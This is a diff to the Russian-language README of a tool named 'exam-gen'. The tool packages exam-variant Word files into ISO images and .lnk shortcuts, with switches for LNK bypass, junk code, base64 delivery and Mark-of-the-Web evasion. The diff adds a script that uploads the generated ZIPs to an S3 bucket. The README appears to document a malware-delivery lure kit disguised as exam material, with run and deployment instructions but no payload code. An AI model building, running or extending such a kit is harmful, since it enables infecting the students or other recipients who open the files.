@@ -22,6 +22,7 @@ pip install -r requirements.txt
 | `pycdlib` | Создание ISO-образов |
 | `pylnk3` | Создание .lnk ярлыков |
 | `docx2pdf` | Конвертация DOCX -> PDF |
+| `boto3` | Загрузка на AWS S3 (для deploy.py) |
 
 ### DOCX -> PDF
 
@@ -120,16 +121,29 @@ LAMBDA_URL='https://...' API_KEY='...' DELIVERY_METHOD=base64_recycle LNK_BYPASS
 $env:DELIVERY_METHOD="base64_recycle"; $env:LNK_BYPASS="1"; $env:JUNK_CODE="1"; python generate.py
 ```
 
+## Деплой на S3
+
+`deploy.py` — запускает `generate.py`, затем загружает все ZIP из `output/` в S3 бакет.
+
+```bash
+# Настроить AWS CLI и .env (S3_BUCKET, S3_REGION)
+python deploy.py
+```
+
+Подробная инструкция: **[docs/aws-setup.md](docs/aws-setup.md)**
+
 ## Структура проекта
 
 ```
 exam-gen/
-├── generate.py          # Основной скрипт
+├── generate.py          # Основной скрипт генерации
+├── deploy.py            # Генерация + загрузка на S3
 ├── requirements.txt     # Зависимости
 ├── .env.example         # Шаблон конфигурации
 ├── .env                 # Конфиг (не в git)
 ├── docs/                # Техническая документация
-│   └── technical.md     # Детали: обфускация, MOTW, junk code
+│   ├── technical.md     # Детали: обфускация, MOTW, junk code
+│   └── aws-setup.md     # Настройка AWS (IAM, S3, CLI)
 ├── variants/            # ВХОД: папки вариантов с .docx
 │   ├── Variant-01/
 │   └── Variant-02/
